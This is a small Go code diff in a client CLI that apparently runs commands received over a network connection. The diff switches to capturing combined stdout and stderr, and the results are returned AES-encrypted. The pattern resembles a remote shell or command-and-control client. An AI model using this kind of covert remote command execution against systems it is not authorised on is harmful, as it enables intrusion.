@@ -76,7 +76,7 @@ func LoadClientCLI() *cobra.Command {
 				}
 
 				/* retrieve output or error & send it back! */
-				out, err := cmd.Output()
+				out, err := cmd.CombinedOutput()
 				if err != nil {
 					fmt.Fprint(conn, aes.EncryptAes("command failure:\n", opts.AesKey))
 					fmt.Fprint(conn, aes.EncryptAes(err.Error(), opts.AesKey))
